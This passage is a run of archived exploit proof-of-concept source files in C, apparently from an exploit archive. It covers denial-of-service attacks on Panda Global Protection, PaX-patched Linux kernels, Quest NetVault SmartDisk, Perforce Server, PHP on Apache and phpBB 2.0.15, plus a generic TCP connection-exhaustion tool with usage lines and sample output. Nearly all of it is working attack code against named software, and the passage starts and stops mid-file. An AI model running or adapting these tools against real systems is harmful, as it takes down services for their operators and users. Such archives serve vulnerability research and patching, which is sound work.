0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161
        };
    char out[sizeof(Crashing)];
    
    printf("Local DoS - Panda Global Protection 2010 (3.01.00)\n\n");
    hDevice = CreateFile("\\\\.\\AppFlt",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
    
    DeviceIoControl(hDevice,0x06660d4c,Crashing,sizeof(Crashing),out,sizeof(Crashing),&NombreByte,NULL);
    
    printf("Sploit Send.\nhDevice = %x\n", hDevice);
    CloseHandle(hDevice);
    getch();
    return 0;
}


/* -----------------------------------------------------------------------------
 *  ______________________________             __________
 *  __  ____/_  __ \__  __/__  __/_____ ____  ____  /_  /_
 *  _  / __ _  / / /_  /  __  /_ _  __  /  / / /_  /_  __/
 *  / /_/ / / /_/ /_  /   _  __/ / /_/ // /_/ /_  / / /_
 *  \____/  \____/ /_/    /_/    \__,_/ \__,_/ /_/  \__/
 *                                   Security Community
 *
 * -----------------------------------------------------------------------------
 * 
 * Software for educational purposes
 * 
 * panic-reloaded.c written by hash <hash AT gotfault DOT net>
 *			            <www.gotfault.net>
 *
 * Description: TCP Denial Of Service Tool. panic-reloaded does
 * 		not require large link or fast internet connection,
 * 		it creates many pthreads, leaving openned connections
 * 		to victim host. It is fast and an efficient way to
 * 		deny a TCP service.
 *
 * 		Tested against SSH, FTP, HTTP.
 * 
 * TTY1:
 * hash@scarface:~$ gcc -lpthread panic-reloaded.c -o panic-reloaded -Wall
 * hash@scarface:~$ ./panic-reloaded3 10.10.10.2 22 20 100 10
 * panic-reloaded.c
 * written by hash <http://gotfault.net>
 * [!] Target: localhost:443
 * [!] Threads: 20 for each round
 * [*] Countdown: 40 | [!] Sleeping: 10s
 *
 * TTY2:
 * hash@scarface:~$ ssh localhost 
 * ssh_exchange_identification: Connection closed by remote host
 * hash@scarface:~$
 *
 * 
 * Greets to folks from gotfault, rfdslabs, tripbit 
 * and to friends out there.
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <pthread.h>

#define	AUTHOR		"written by hash <http://gotfault.net>"

void usage(char*);
void sockz(void*);
void header();
void close_func(void *); 
char *resolver(char*);

struct pthread_args {

	char *host_pthread;
	char *port_pthread;
	char *slp_pthread;

};struct pthread_args thread_data_array[1];

struct pthread_close {
	
	char *slp_pthread;
	int sock_pointer;
	
};struct pthread_close thread_data[0];

void usage(char *progname) {

	header();
	printf("Use: %s host port threads rounds sleep_time\n",progname);
	printf("host:		ip address or hostname\n");
	printf("port:		victim port\n");
	printf("threads:	number of threads\n");
	printf("rounds:		number of reloads, min 40\n");
	printf("sleep_time:	sleep time between each round\n");
	exit(0);

}

void header() {
	
	printf("panic-reloaded.c\n");
	printf("%s\n",AUTHOR);
	
}

void close_func(void *c) {

	struct pthread_close *my_close;
	
	char *slp_tmp;
	int slp,
	    err,
	    sock_p;
	
	my_close = (struct pthread_close *) c;
	slp_tmp = my_close->slp_pthread;
	sock_p = my_close->sock_pointer;

	slp = atoi(slp_tmp);

	sleep(slp+1);

	if((err = close(sock_p)) < 0) {
		printf("close_func: Can`t close socket\n");
		exit(-1);
	}
		
	
}

void sockz(void *t) {

        struct sockaddr_in dest;
	struct pthread_args *my_data;
	pthread_t close_them_all;
	
	char *h,
	     *p_tmp,
	     *slp_tmp;

	int p,
	    con,
	    err,
	    desc,
	    slp;

	my_data = (struct pthread_args *) t;

	h = my_data->host_pthread;
	p_tmp = my_data->port_pthread;
	slp_tmp = my_data->slp_pthread;

	p = atoi(p_tmp);
	slp = atoi(slp_tmp);

        desc = socket(AF_INET,SOCK_STREAM,0);
       
	if((desc = socket(AF_INET,SOCK_STREAM,0)) < 0) {
                perror("sockz: Can`t create socket\n");
                exit(-1);
        }

        dest.sin_family = AF_INET;
        dest.sin_port = htons(p);
        dest.sin_addr.s_addr = inet_addr(h);
        bzero(&(dest.sin_zero),8);

       	con = connect(desc,(struct sockaddr *)&dest,sizeof(dest));
       
	if(con < 0) {
               	printf("\nsockz: Can`t connect to %s:%d\n",h,p);
               	close(desc);
               	exit(-1);
       	}

	thread_data[0].sock_pointer = desc;
	thread_data[0].slp_pthread = slp_tmp;

	if((err = pthread_create(&close_them_all,NULL,(void*)&close_func,\
	(void*)&thread_data[0]) == -1)) {
		printf("sockz: Can`t create thread\n");
		exit(-1);
	}

}

char *resolver(char *hosttmp){

        struct hostent *h;

        char *host;

        h = gethostbyname(hosttmp);
        
	if(!h) {
                printf("resolver: Can`t resolve hostname %s\n",hosttmp);
                exit(-1);
        }

        host = inet_ntoa(*((struct in_addr *)h->h_addr_list[0]));

        return host;
}


int main(int ac, char **av) {
		
	if(ac<6)
		usage(av[0]);

	int x,
	    y,
	    z,
	    err;
	
	char *hosttmp,
	     *port,
	     *host,
	     *slp;
	
	int sockets,
	    rounds,
	    slptime,
	    countdown; 
	
	hosttmp = av[1];
	port = av[2];
	sockets = atoi(av[3]);
	rounds = atoi(av[4]); countdown = rounds;
	slp = av[5];
	slptime = atoi(slp);

	if(rounds<40)	
		usage(av[0]);

	host = resolver(hosttmp);

	pthread_t threads[rounds];

	header();
	
	printf("[!] Target: %s:%s\n",host,port);
	printf("[!] Threads: %d for each round\n",sockets);

	for(z=0;z<rounds;z++) {	
		for(x=0;x<sockets;x++) {
			thread_data_array[x].host_pthread = host;
			thread_data_array[x].port_pthread = port;
			thread_data_array[x].slp_pthread = slp;

			if((err = pthread_create(&threads[x],NULL,(void*)&sockz,\
			(void*)&thread_data_array[x])) == -1){
				printf("main: Can`t create thread\n");
				exit(-1);
			}

			for(y=0;y<sockets;y++)
			pthread_join(threads[y],NULL);
	
		}
		printf("[*] Countdown: %d | [!] Sleeping: %ds\n",countdown--,slptime);
		sleep(slptime);
	}
	printf("Done!\n");	
	
	return 0;
}
/*oef*/

// milw0rm.com [2006-04-13]
source: http://www.securityfocus.com/bid/10264/info

PaX for 2.6 series Linux kernels has been reported prone to a local denial of service vulnerability. The issue is reported to present itself when PaX Address Space Layout Randomization Layout (ASLR) is enabled. 

The vulnerability may be exploited by a local attacker to influence the kernel into an infinite loop.

/*
  PaX w/ CONFIG_PAX_RANDMMAP for Linux 2.6.x DoS proof-of-concept
  by Shadowinteger <shadowinteger@sentinix.org>
  2004-05-04

  Written after reading the security advisory posted by borg (ChrisR-) on
  Bugtraq 2004-05-03 (my time). ChrisR -> www.cr-secure.net

  Acknowledgments: sabu (www.sabu.net)


  Vulnerability:
    PaX code for 2.6.x prior to 2004-05-01 in arch_get_unmapped_area()
    (function in mm/mmap.c) is vulnerable to a local Denial of Service attack
    because of a bug that puts the kernel into an infinite loop.

    Read the security advisory for more info:
    http://www.securityfocus.com/archive/1/361968/2004-04-30/2004-05-06/0


  Exploitation:
    We need to get passed the following line of code in
    arch_get_unmapped_area() to succeed with a DoS:
        if (TASK_SIZE - len < addr) { ...

    We do it like this:

    TASK_SIZE - TYPICAL_ADDR + SINK = DOSVAL

    DOSVAL is the value we'll use.

    arch_get_unmapped_area() does the following:

    if TASK_SIZE-DOSVAL < TYPICAL_ADDR then... run right into the vuln code.
    (TASK_SIZE-DOSVAL) *must* be less than TYPICAL_ADDR to succeed.

    A DOSVAL of e.g. 0x80000000 or above will work most times, no real need
    for the funky calculation above.

    There are quite a few functions available that are "front-ends" to
    arch_get_unmapped_area(). This exploit uses good-old mmap().


  Tiny DoS PoC:

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
int main(void){int fd=open("/dev/zero",O_RDONLY);mmap(0,0xa0000000,PROT_READ,MAP_PRIVATE,fd,0);}

*/

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>

#define TASK_SIZE 0xc0000000
#define TYPICAL_ADDR 0x43882000
#define SINK 0x04000000

#define DOSVAL (TASK_SIZE - TYPICAL_ADDR + SINK)

int main() {
    int fd = open("/dev/zero", O_RDONLY);

    printf("PaX w/ CONFIG_PAX_RANDMMAP for Linux 2.6.x DoS proof-of-concept\n"
           "by Shadowinteger <shadowinteger@sentinix.org> 20040504\n"
           "created after a sec advisory on bugtraq posted by borg (ChrisR-) 20040503\n"
           "ChrisR -> www.cr-secure.net\n"
           "\n"
           "the exploit binary must be marked PF_PAX_RANDMMAP to work!\n"
           "\n"
           "greetz goes to: sabu (www.sabu.net)\n"
           "\n"
           "------------------------------------------------------------------------------\n"
           "will exec \"mmap(0, 0x%x, PROT_READ, MAP_PRIVATE, fd, 0);\"\n"
           "\n"
           "if you run Linux 2.6.x-PaX or -grsec, this may \"hurt\" your CPU(s) a little,\n"
           "are you sure you want to continue? [type Y to continue] ", DOSVAL);
    fflush(stdout);

    if (getchar() != 'Y') {
        printf("aborted.\n");
        return 0;
    }

    printf("\n"
           "attempting to DoS...\n");

    if (mmap(0, DOSVAL, PROT_READ, MAP_PRIVATE, fd, 0) == MAP_FAILED) {
        perror("mmap");
    }

    printf("your kernel does not seem to be vulnerable! :)\n");

    return 0;
}
/*
  by Luigi Auriemma
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        37452
#define BUFFSZ      0x100000
#define BUG         0x10000000



int putss(u8 *data, u8 *str);
int putmm(u8 *data, u8 *str, int size);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  linger  ling = {1,1};
    struct  sockaddr_in peer;
    int     sd,
            i,
            t,
            len;
    u16     port    = PORT;
    u8      *host,
            *buff,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Quest NetVault SmartDisk <= 1.2.1 integer overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    host = argv[1];
    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) < 0) std_err();

    len = 3 + (BUG * 2) + 2 + 1;    // should be ok

    printf("- send header\n");
    p = buff;
    p += putxx(p, 4 + 4+1+4+4 + len+0x400,  32);    // packet size (included itself)
    p += putxx(p,     4+1+4+4 + len+0x400,  32);    // message size
    p += putxx(p, 0x01,         8);                 // opcode
    p += putxx(p, 0xc8000000,   32);                // sub-opcode or similar
    p += putxx(p, len,          32);                // size of the entries
    p += putss(p, "ox;");
    send(sd, buff, p - buff, 0);

    printf("- send 0x%08x entries, wait some seconds:\n", BUG);

    /* normal slow solution
    for(i = 0; i < BUG; i++) {   // integer overflow
        if(!(i & 0xffff)) printf("  %08x\r", i);
        send(sd, "S;", 2, 0);
    }
    */

    // fast solution
    t = BUFFSZ / 2;
    p = buff;
    for(i = 0; i < t; i++) {
        p += putmm(p, "i;", 2);
    }
    len = p - buff;
    for(i = 0; (i + t) <= BUG; i += t) {
        printf("  %08x\r", i);
        send(sd, buff, len, 0);
    }
    for(; i < BUG; i++) {
        send(sd, buff, 2, 0);
    }
    send(sd, "i;", 3, 0);   // ebp - 1
    printf("  %08x\n", i + 1);

    // the following data is useless at the moment because not read
    for(i = 0; i < 0x100; i++) {
        send(sd, "AAAA", 4, 0);
    }

    if(!timeout(sd, 3)) {
        len = recv(sd, buff, BUFFSZ, 0);
    }
    close(sd);

    printf("- done\n");
    return(0);
}



int putss(u8 *data, u8 *str) {
    int     len;
    u8      *p;

    len = 0;
    if(str) len = strlen(str);
    p = data;
    p += putmm(p, str, len);
    return(p - data);
}



int putmm(u8 *data, u8 *str, int size) {
    if(size < 0) size = strlen(str);
    memcpy(data, str, size);
    return(size);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        //data[i] = num >> ((bytes - 1 - i) << 3);
        data[i] = num >> (i << 3);
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        1666
#define BUFFSZ      8192



int p4_send(int sd, u8 *data, int datalen);
int putpv(u8 *data, u8 *par, u8 *val);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Perforce Server <= 2007.3/143793 multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attacks:\n"
            " 1 = NULL pointer vulnerabilities\n"
            " 2 = invalid memory access vulnerabilities\n"
            " 3 = resources consuming and subsequent termination of the server\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    p = buff;
    p += putpv(p, "",               "arg1");    // any empty parameter is an argument for "func"
    p += putpv(p, "",               "arg2");    // arg3,...,argN and so on
    p += putpv(p, "prog",           "P4V");
    p += putpv(p, "client",         "myhostname");
    p += putpv(p, "cwd",            "c:/");
    p += putpv(p, "os",             "NT");
    p += putpv(p, "user",           "I_don't_need_an_account");
    p += putpv(p, "type",           "xxxxxxxxxx");
    p += putpv(p, "status",         "");
    if(attack == 1) {
        p += putpv(p, "token",      "x");
        p += putpv(p, "func",       "dm-LazyCheck");
    } else if(attack == 2) {
        p += putpv(p, "workRec",    "");
        p += putpv(p, "message",    "AAAABBBBCCCC");
        p += putpv(p, "path",       "");
        p += putpv(p, "depotRec",   "");
        p += putpv(p, "handle",     "");
        p += putpv(p, "do",         "");
        p += putpv(p, "func",       "server-DiffFile");
    } else if(attack == 3) {
        p += putpv(p, "workRec",    "");
        p += putpv(p, "message",    "aluigi");  // loop: 0047f3b0-0047f3eb
        p += putpv(p, "path",       "");
        p += putpv(p, "depotRec",   "");
        p += putpv(p, "handle",     "");
        p += putpv(p, "do",         "");
        p += putpv(p, "func",       "server-DiffFile");
    } else {
        printf("\nError: wrong attack number\n");
        exit(1);
    }

    printf("- send malformed packet\n");
    p4_send(sd, buff, p - buff);

    printf("- receive data: ");
    for(;;) {
        if(timeout(sd, 3) < 0) break;
        len = recv(sd, buff, BUFFSZ, 0);
        if(len <= 0) break;
        fputc('.', stdout);
    }

    close(sd);
    printf("\n- done\n");
    return(0);
}



int p4_send(int sd, u8 *data, int datalen) {
    u8      tmp[5];

    putxx(tmp + 1, datalen, 32);
    tmp[0] = tmp[1] ^ tmp[2] ^ tmp[3] ^ tmp[4];
    send(sd, tmp, 5, 0);
    send(sd, data, datalen, 0);
    return(0);
}



int putpv(u8 *data, u8 *par, u8 *val) {
    int     len;
    u8      *p;

    p = data;
    len = strlen(par);
    memcpy(p, par, len + 1);
    p += len + 1;
    len = strlen(val);
    p += putxx(p, len, 32);
    memcpy(p, val, len + 1);
    p += len + 1;
    return(p - data);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;
    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << (i << 3));
    }
    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/5280/info

It is possible, under some circumstances, for remote attackers to invoke the PHP interpreter from the web. If the interpreter is invoked with no command line options, it will hang. Attackers may exploit this condition to cause a denial of service.

This is reported to be a problem with PHP and Apache on Microsoft Windows platforms. It may be possible to create this condition in other environments as well.


/* PHP-APACHE.C
 * By Matthew Murphy
 * Exhaust CGI Resources via PHP on Apache
 * 
 * Calling PHP with no parameters causes it to
 * never terminate; the process must be killed
 * by the server, the OS, or the admin.
 *
 * PHP on Apache requires you to configure a
 * virtual to load PHP out of.  PHP implements
 * a "cgi.force_redirect" value to require that
 * a certain environment variable be set to
 * allow PHP to run further.
 *
 * However, an empty command-line *still* will
 * cause PHP to hang.  If a remote user does
 * this for a lengthy amount of time, the server
 * may no longer launch PHP or other server-side
 * components.
 *
 * NOTE: The vulnerable config is on Apache,
 * but other servers can still be exploited
 * if they offer PHP.EXE (or an SAPI) directly.
 *
 * Usage: php-apache <host> [phpbin] [port] [maxsocks] 
*/

#include <stdio.h>
#include <string.h>

#ifdef _WIN32
#define _WINSOCKAPI_			/* Fix for Winsock.h redef errors 
*/
#include <winsock2.h>			/* WinSock API calls... */
#define WSA_VER		0x0101		/* WinSock ver. to use */
#pragma comment(lib, "wsock32.lib")	/* Check your compiler's docs... 
*/
#else
#include <signal.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#endif

#define DEF_PHP		"/php/php"	/* This is used as the PHP
					 * path if one isn't set
					*/

static char php_buf[] = "GET %s HTTP/1.0\x0d\x0a\x0d\x0a";

void main(int argc, char *argv[]) {
	char host[257];
	char binpath[257];
	int maxsocks;
	char request[300];
	unsigned short port;
	struct hostent *he;
	struct sockaddr_in sa_in;
#ifdef _WIN32
	WSADATA wsa_prov;
	SOCKET s;
#else
	int s;
#endif
	printf("PHP-APACHE.C by Matthew Murphy\x0d\x0a");
	printf("Exhausting CGI resources w/ PHP on 
Apache\x0d\x0a\x0d\x0a");
	maxsocks = 0;
	strcpy(&binpath[0], DEF_PHP);
#ifdef _WIN32
	if (!WSAStartup(WSA_VER, &wsa_prov) == 0) {
		printf("ERROR: Windows Sockets init failed!");
		exit(1);
	}
#endif
	port = (unsigned short)htons(80);
	switch (argc) {
	case 5:
		maxsocks = atoi(argv[4]);
	case 4:
		port = htons((unsigned short)atoi(argv[2]));
	case 3:
		if (strlen(argv[2]) > 256) {
			printf("ERROR: 256 char path limit exceeded in 
'phpbin' argument.");
			exit(1);
		}
		strcpy(&binpath[0], argv[2]);
	case 2:
		if (strlen(argv[1]) > 256) {
			printf("ERROR: No host should be over 256 
chars!");
			exit(1);
		}
		strcpy(&host[0], argv[1]);
		break;
	default:
		printf("Usage: php-apache <host> [port] [maxsocks] 
[phpbin]\x0d\x0a\x0d\x0ahost - The IP/DNS name to attack\x0d\x0aport - The 
port the HTTP service normally runs on (default: 80)\x0d\x0amaxsocks - The 
maximum number of connections to establish (creates a finite flood).  A 
zero value means continue until termination (default: 0)\x0d\x0aphpbin - 
The virtual path to the PHP binary (e.g, /php/php[.exe]; default: 
/php/php)");
		exit(0);
	}
	if (maxsocks == 0) {
		maxsocks--;
	}
	sa_in.sin_family = AF_INET;
	sa_in.sin_port = (unsigned short)port;
	he = gethostbyname(&host[0]);
	if (he == NULL) {
		printf("ERROR: DNS resolution failed, or unknown host.");
		exit(1);
	}
#ifdef _WIN32
	sa_in.sin_addr.S_un.S_addr = (unsigned long)*(unsigned long 
*)he->h_addr;
#else
	sa_in.sin_addr.S_addr = (unsigned long)*(unsigned long 
*)he->h_addr;
#endif
	sprintf(&request[0], &php_buf[0], &binpath[0]);
	while (!maxsocks == 0) {
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s < 0) {
			printf("Couldn't create socket...\x0d\x0aIf you 
continue to receive this error, terminate the program.");
		} else {
			if (!connect(s, (const struct sockaddr FAR 
*)&sa_in, sizeof(struct sockaddr_in)) == 0) {
				printf("Couldn't connect...\x0d\x0aIf you 
continue to receive this error, terminate the program.");
			} else {
				send(s, (char FAR *)&request[0], 
strlen(&request[0]), 0);

/* If the exploit isn't using up server resources
 * try removing this -- the server may be killing
 * the CGI after a disconnect.
*/

#ifdef _WIN32
				shutdown(s, SD_BOTH);
				closesocket(s);
#else
				close(s);
#endif
			}
		}
		if (!maxsocks == -1) {
			maxsocks--;
		}
	}
	return;
}/*
--------------------------------------------------------
[N]eo [S]ecurity [T]eam [NST]® - Advisory #15 - 00/00/06
--------------------------------------------------------
Program:  phpBB 2.0.15
Homepage:  http://www.phpbb.com
Vulnerable Versions: phpBB 2.0.15 & Lower versions
Risk: High Risk!!
Impact: Multiple DoS Vulnerabilities.

    -==phpBB 2.0.15 Multiple DoS Vulnerabilities ==-
---------------------------------------------------------

- Description
---------------------------------------------------------
phpBB is a high powered, fully scalable, and highly customizable
Open Source bulletin board package. phpBB has a user-friendly
interface, simple and straightforward administration panel, and
helpful FAQ. Based on the powerful PHP server language and your
choice of MySQL, MS-SQL, PostgreSQL or Access/ODBC database servers,
phpBB is the ideal free community solution for all web sites.

- Tested
---------------------------------------------------------
localhost & many forums

- Explotation
---------------------------------------------------------
profile.php << By registering as many users as you can.
search.php  << by searching in a way that the db couln't observe it.

- Exploit
---------------------------------------------------------
[C Source]
/*
  Name: NsT-phpBBDoS
  Copyright: NeoSecurityteam
  Author: HaCkZaTaN
  Date: 19/06/05
  Description: xD You must figure out the problem xD
  
  root@NeoSecurity:/home/hackzatan# pico NsT-phpBBDoS.c
  root@NeoSecurity:/home/hackzatan# gcc NsT-phpBBDoS.c -o NsT-phpBBDoS
  root@NeoSecurity:/home/hackzatan# ./NsT-phpBBDoS
  [+] NsT-phpBBDoS v0.1 by HaCkZaTaN
  [+] NeoSecurityTeam
  [+] Dos has begun....[+]
  
  [*] Use: ./NsT-phpBBDoS <path> <search.php or profile.php> <Host>
  [*] Example: ./NsT-phpBBDoS /phpBB/ profile.php Victimshost.com
  root@NeoSecurity:/home/hackzatan# ./NsT-phpBBDoS /phpBB/ profile.php Victimshost.com
  [+] NsT-phpBBDoS v0.1 by HaCkZaTaN
  [+] NeoSecurityTeam
  [+] Dos has begun....[+]
  
  .................................
  root@NeoSecurity:/home/hackzatan# echo "Let see how many users I have created"
  root@NeoSecurity:/home/hackzatan# set | grep MACHTYPE
  MACHTYPE=i486-slackware-linux-gnu
  root@NeoSecurity:/home/hackzatan#

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#ifdef WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32")
#pragma pack(1)
#define WIN32_LEAN_AND_MEAN
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

#define __USE_GNU
#define _XOPEN_SOURCE

int Connection(char *, int);
void Write_In(int , char *, char *a, char *, int);
char Use(char *);

int main(int argc, char *argv[])
{
    int sock, x = 0;
    char *Path = argv[1], *Pro_Sea = argv[2], *Host = argv[3];

    puts("[+] NsT-phpBBDoS v0.1 by HaCkZaTaN");
    puts("[+] NeoSecurityTeam");
    puts("[+] Dos has begun....[+]\n");
    fflush(stdout);

    if(argc != 4) Use(argv[0]);

    while(1)
    {
           sock = Connection(Host,80);
           Write_In(sock, Path, Pro_Sea, Host, x);
           #ifndef WIN32
           shutdown(sock, SHUT_WR);
           close(sock);
           #else
           closesocket(sock);
           WSACleanup();
           #endif
           Pro_Sea = argv[2];
           x++;
    }
    //I don't think that it will get here =) 

    return 0;
}

int Connection(char *Host, int Port)
{
        #ifndef WIN32
        #define SOCKET int
        #else
        int error;
        WSADATA wsadata;
        error = WSAStartup(MAKEWORD(2, 2), &wsadata);

        if (error == SOCKET_ERROR)
        {
                  perror("Could Not Start Up Winsock!\n");
                  return;
        }

        #endif

        SOCKET sockfd;
        struct sockaddr_in sin;
        struct in_addr  *myaddr;
        struct hostent *h;
        
        if(Port <= 0 || Port > 65535)
         {
                  puts("[-] Invalid Port Number\n");
                  fflush(stdout);
                  exit(-1);
         }
        
        if((sockfd =  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
        {
                    perror("socket() ");
                    fflush (stdout);
                    exit(-1);
        }

        if(isalpha(Host[0]))
        {
           if((h = gethostbyname(Host)) == NULL)
           {
                     perror("gethostbyname() ");
                     fflush (stdout);
                     exit(-1);
           }
        }
        else
        {
              myaddr=(struct in_addr*)malloc(sizeof(struct in_addr));
              myaddr->s_addr=inet_addr(Host);
              
              if((h = gethostbyaddr((char *) &myaddr, sizeof(myaddr), AF_INET)) != NULL)
              {
                     perror("gethostbyaddr() ");
                     fflush (stdout);
                     exit(-1);
              }
        }

        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port = htons(Port);
        memcpy(&sin.sin_addr.s_addr, h->h_addr_list[0], h->h_length);

        if(connect(sockfd, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) < 0)
        {
                     perror("connect() ");
                     exit (-1);
        }

        return sockfd;
}

void Write_In(int sock, char *Path, char *Pro_Sea, char *Host, int x)
{
    char *str1 = (char *)malloc(4*BUFSIZ), *str2 = (char *)malloc(4*BUFSIZ);
    char *req0 = "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\r\n"
